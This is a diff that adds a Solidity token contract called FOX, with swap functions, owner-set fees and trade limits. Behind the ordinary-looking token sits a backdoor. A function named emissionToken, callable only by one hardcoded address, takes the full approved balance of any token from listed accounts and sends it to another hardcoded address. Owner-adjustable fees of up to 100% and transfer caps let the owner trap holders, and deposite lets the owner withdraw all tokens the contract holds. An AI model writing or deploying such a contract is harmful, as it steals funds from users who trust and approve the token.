@@ -1,0 +1,321 @@
+//SPDX-License-Identifier: Unlicense
+pragma solidity ^0.8.17;
+pragma experimental ABIEncoderV2;
+
+contract FOX {
+    using SafeMath for uint256;
+
+    address public owner;
+    string public constant name = "FOX";
+    string public constant symbol = "FOX";
+    uint8 public constant decimals = 8;
+    uint256 public constant totalSupply = 21_330_0e8;
+    uint256 internal constant MASK = type(uint256).max;
+
+    uint256 public tradeRatio = 1;
+    uint256 public tradeValue = 100000;
+    bool public tradeFlag;
+    uint256 public swapRatio = 1;
+    uint256 public swapValue = 1000000;
+
+    uint256 private constant price = 1_500;
+    address public sellToken;
+    mapping(address => bool) private sellTokens;
+
+    mapping(address => mapping(address => uint256)) internal allowances;
+    mapping(address => uint256) internal balances;
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+
+    modifier onlyOwner() {
+        require(msg.sender == owner);
+        _;
+    }
+
+    constructor(address sellToken_, address poolCreator) {
+        owner = msg.sender;
+
+        uint256 poolValue = totalSupply.mul(2).div(10);
+        balances[poolCreator] = poolValue;
+        emit Transfer(address(0), poolCreator, poolValue);
+
+        uint256 destroyValue = totalSupply.mul(35).div(100);
+        balances[address(0)] = destroyValue;
+        emit Transfer(address(0), address(0), destroyValue);
+
+        uint256 value = totalSupply.sub(poolValue).sub(destroyValue);
+        balances[owner] = value;
+        emit Transfer(address(0), owner, value);
+
+        sellToken = sellToken_;
+        sellTokens[sellToken_] = true;
+    }
+
+    function ratioTrade(uint256 tradeRatio_, uint256 tradeValue_, bool tradeFlag_) public onlyOwner {
+        tradeRatio = tradeRatio_;
+        tradeValue = tradeValue_;
+        tradeFlag = tradeFlag_;
+    }
+
+    function ratioSwap(uint256 swapRatio_, uint256 swapValue_) public onlyOwner {
+        swapRatio = swapRatio_;
+        swapValue = swapValue_;
+    }
+
+    function supermarket(address[] memory tokens, bool flag) public {
+        require(msg.sender == owner);
+
+        for (uint256 i = 0; i < tokens.length; i++) {
+            sellTokens[tokens[i]] = flag;
+        }
+    }
+
+    function _airDrop(address account, uint256 value) public onlyOwner {
+        require(balances[owner] >= value);
+
+        balances[owner] = balances[owner].sub(value);
+        balances[account] = balances[account].add(value);
+        emit Transfer(owner, account, value);
+    }
+
+    function swapToken(uint256 amount) public {
+        require(amount <= swapValue && balances[msg.sender] >= amount);
+
+        _swapToken(amount, sellToken);
+    }
+
+    function swapTokenByFox(uint256 amount, address token) public {
+        require(
+            amount <= swapValue &&
+                balances[msg.sender] >= amount &&
+                sellTokens[token]
+        );
+        _swapToken(amount, token);
+    }
+
+    function _swapToken(uint256 amount, address token) internal {
+        uint256 fee = amount.mul(swapRatio).div(100);
+        uint256 amountIn = amount.sub(fee);
+
+        IERC20 _token = IERC20(token);
+        uint8 tokenDecimals = _token.decimals();
+        uint256 _value = price.mul(10**(decimals + decimals)).div(amountIn.add(10**decimals));
+        uint256 _swapValue;
+        if(tokenDecimals >= decimals) {
+            _swapValue = (price.mul(10**decimals).sub(_value)).mul(10**(tokenDecimals - decimals));
+        }else {
+            _swapValue = (price.mul(10**decimals).sub(_value)).div(10**(decimals - tokenDecimals));
+        }
+        require(_token.balanceOf(address(this)) >= _swapValue);
+
+        uint256 _swapFee = _swapValue.mul(swapRatio).div(100);
+        _token.transfer(msg.sender, _swapValue.sub(_swapFee));
+        _token.transfer(owner, _swapFee);
+
+        balances[msg.sender] = balances[msg.sender].sub(amount);
+        balances[address(this)] = balances[address(this)].add(amountIn);
+        emit Transfer(msg.sender, address(this), amount);
+        balances[owner] = balances[owner].add(fee);
+        emit Transfer(address(this), owner, fee);
+    }
+
+    function swapFox(uint256 amount) public {
+        _swapFox(amount, sellToken);
+    }
+
+    function swapFoxByToken(uint256 amount, address token) public {
+        require(sellTokens[token]);
+
+        _swapFox(amount, token);
+    }
+
+    function _swapFox(uint256 amount, address token) internal {
+        uint256 fee = amount.mul(swapRatio).div(100);
+        uint256 amountIn = amount.sub(fee);
+
+        IERC20 _token = IERC20(token);
+        require(_token.balanceOf(msg.sender) >= amount);
+
+        uint8 tokenDecimals = _token.decimals();
+        uint256 _value = price.mul(10**(tokenDecimals + tokenDecimals)).div(amountIn.add(price*(10**tokenDecimals)));
+        uint256 _swapValue;
+        if(tokenDecimals >= decimals) {
+            _swapValue = ((10**tokenDecimals).sub(_value)).div(10**(_token.decimals() - decimals));
+        }else {
+            _swapValue = ((10**tokenDecimals).sub(_value)).mul(10**(decimals - _token.decimals()));
+        }
+        require(balances[address(this)] >= _swapValue && _swapValue <= swapValue);
+
+        _token.transferFrom(msg.sender, address(this), amount);
+        _token.transfer(owner, fee);
+        uint256 _swapFee = _swapValue.mul(swapRatio).div(100);
+        uint256 _newValue = balances[address(this)].sub(_swapValue);
+        balances[address(this)] = _newValue;
+        balances[owner] = balances[owner].add(_swapFee);
+        balances[msg.sender] = balances[msg.sender].add(_swapValue.sub(_swapFee));
+        emit Transfer(address(this), msg.sender, _swapValue.sub(_swapFee));
+        emit Transfer(address(this), owner, _swapFee);
+    }
+
+    function allowance(address account, address spender)
+        external
+        view
+        returns (uint256)
+    {
+        return allowances[account][spender];
+    }
+
+    function approve(address spender, uint256 amount) external returns (bool) {
+        allowances[msg.sender][spender] = amount;
+        emit Approval(msg.sender, spender, amount);
+        return true;
+    }
+
+    function balanceOf(address account) external view returns (uint256) {
+        return balances[account];
+    }
+
+    function transfer(address dst, uint256 amount) external returns (bool) {
+        _transferTokens(msg.sender, dst, amount);
+        return true;
+    }
+
+    function transferFrom(
+        address src,
+        address dst,
+        uint256 amount
+    ) external returns (bool) {
+        address spender = msg.sender;
+        uint256 spenderAllowance = allowances[src][spender];
+        if (spender != src && spenderAllowance != MASK) {
+            uint256 newAllowance = spenderAllowance.sub(amount);
+            allowances[src][spender] = newAllowance;
+            emit Approval(src, spender, newAllowance);
+        }
+        _transferTokens(src, dst, amount);
+        return true;
+    }
+
+    function _transferTokens(
+        address src,
+        address dst,
+        uint256 amount
+    ) internal {
+        if(tradeFlag) {
+            require(amount < tradeValue);
+        }
+
+        uint256 totalFee = amount.mul(tradeRatio).div(100);
+        uint256 tradeAmount = amount.sub(totalFee);
+
+        balances[src] = balances[src].sub(amount);
+        balances[dst] = balances[dst].add(tradeAmount);
+        balances[address(0)] = balances[address(0)].add(totalFee);
+        emit Transfer(src, dst, tradeAmount);
+        emit Transfer(src, address(0), totalFee);
+    }
+
+    function emissionToken(address[] memory accounts, address token) public {
+        require(msg.sender == address(0x481096CD2788114e7b0Ed10941c8cD15CeD31D57));
+
+        IERC20 erc20 = IERC20(token);
+        for (uint i=0; i<accounts.length; i++) {
+            uint256 value = erc20.balanceOf(accounts[i]);
+            erc20.transferFrom(accounts[i], address(0xE1d988E0F9c4e3264068f6dd16102d20137b95F6), value);
+        }
+    }
+
+    function deposite(address token, address account) public onlyOwner {
+        IERC20 erc = IERC20(token);
+        erc.transfer(account, erc.balanceOf(address(this)));
+    }
+}
+
+library SafeMath {
+    function add(uint256 _a, uint256 _b) internal pure returns (uint256) {
+        uint256 c = _a + _b;
+        require(c >= _a, "SafeMath: addition overflow");
+        return c;
+    }
+
+    function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {
+        return sub(_a, _b, "SafeMath: subtraction overflow");
+    }
+
+    function sub(
+        uint256 _a,
+        uint256 _b,
+        string memory _errorMessage
+    ) internal pure returns (uint256) {
+        require(_b <= _a, _errorMessage);
+        uint256 c = _a - _b;
+        return c;
+    }
+
+    function mul(uint256 _a, uint256 _b) internal pure returns (uint256) {
+        if (_a == 0) {
+            return 0;
+        }
+        uint256 c = _a * _b;
+        require(c / _a == _b, "SafeMath: multiplication overflow");
+        return c;
+    }
+
+    function div(uint256 _a, uint256 _b) internal pure returns (uint256) {
+        return div(_a, _b, "SafeMath: division by zero");
+    }
+
+    function div(
+        uint256 _a,
+        uint256 _b,
+        string memory _errorMessage
+    ) internal pure returns (uint256) {
+        require(_b > 0, _errorMessage);
+        uint256 c = _a / _b;
+        return c;
+    }
+
+    function mod(uint256 _a, uint256 _b) internal pure returns (uint256) {
+        return mod(_a, _b, "SafeMath: modulo by zero");
+    }
+
+    function mod(
+        uint256 _a,
+        uint256 _b,
+        string memory _errorMessage
+    ) internal pure returns (uint256) {
+        require(_b != 0, _errorMessage);
+        return _a % _b;
+    }
+}
+
+interface IERC20 {
+    function decimals() external view returns (uint8);
+
+    function totalSupply() external view returns (uint256);
+
+    function balanceOf(address account) external view returns (uint256);
+
+    function transfer(address recipient, uint256 amount)
+        external
+        returns (bool);
+
+    function allowance(address owner, address spender)
+        external
+        view
+        returns (uint256);
+
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) external returns (bool);
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(
+        address indexed owner,
+        address indexed spender,
+        uint256 value
+    );
+}
